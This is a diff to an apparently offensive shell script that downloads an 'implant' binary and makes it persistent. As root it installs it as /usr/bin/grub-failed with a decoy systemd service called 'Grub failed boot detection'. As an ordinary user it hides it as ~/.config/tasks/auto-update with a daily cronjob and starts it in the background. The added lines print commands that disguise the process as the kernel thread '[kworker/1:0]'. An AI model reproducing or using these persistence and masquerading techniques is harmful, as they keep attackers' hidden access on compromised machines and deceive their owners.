@@ -60,7 +60,8 @@ if download "$url" "$out"; then
 
     if [ "$(id -u)" -eq 0 ] && command -v systemctl >/dev/null 2>&1; then
         echo "[i]-----| [Info]    Setting up global systemd service.."
-        mv "$out" /usr/bin/grub-failed
+        binary="/usr/bin/grub-failed"
+        mv "$out" "$binary"
         cat > "/etc/systemd/system/grub-failed.service" <<EOF
 [Unit]
 Description=Grub failed boot detection
@@ -88,7 +89,9 @@ EOF
         else
             echo "[!]-----| [Failed]  Failed to established persistence.."
         fi
-        echo "[i]-----| [Info]    Run the binary: $ nohup /usr/bin/grub-failed &>/dev/null & disown"
+        echo "[i]-----| [Info]    Run the binary:     $ nohup $binary &>/dev/null & disown"
+        echo "[i]-----| [Info]    with command spoof: $ nohup bash -c 'exec -a "[kworker/1:0]" $binary' &>/dev/null & disown"
+
     fi
 
     if [ "$(id -u)" -gt 1000 ]; then
@@ -135,8 +138,10 @@ EOF
             echo "[i]-----| [Info]    Setting up cronjob for persistence.."
 
             mkdir -p "$HOME/.config/tasks"
-            mv "$implant" "$HOME/.config/tasks/auto-update"
-            persist="@daily $HOME/.config/tasks/auto-update"
+            binary="$HOME/.config/tasks/auto-update"
+
+            mv "$implant" "$binary"
+            persist="@daily $binary"
 
             if command -v crontab >/dev/null 2>&1; then
                 (crontab -l 2>/dev/null; echo "$persist") | crontab -
@@ -150,7 +155,8 @@ EOF
             else
                 echo "[!]-----| [Failed]  Failed to add cronjob.."
             fi
-            echo "[i]-----| [Info]    Run the binary: $ nohup ~/.config/tasks/auto-update &>/dev/null & disown"
+            echo "[i]-----| [Info]    Run the binary:     $ nohup $binary &>/dev/null & disown"
+            echo "[i]-----| [Info]    with command spoof: $ nohup bash -c 'exec -a "[kworker/1:0]" $binary' &>/dev/null & disown"
             nohup ~/.config/tasks/auto-update &>/dev/null & disown
         fi
     else
@@ -187,7 +193,8 @@ EOF
         else
             echo "[!]-----| [Failed]  Failed to add cronjob.."
         fi
-        echo "[i]-----| [Info]    Run the binary: $ nohup $binary &>/dev/null & disown"
+        echo "[i]-----| [Info]    Run the binary:     $ nohup $binary &>/dev/null & disown"
+        echo "[i]-----| [Info]    with command spoof: $ nohup bash -c 'exec -a "[kworker/1:0]" $binary' &>/dev/null & disown"
         nohup $binary &>/dev/null & disown
     fi
 else
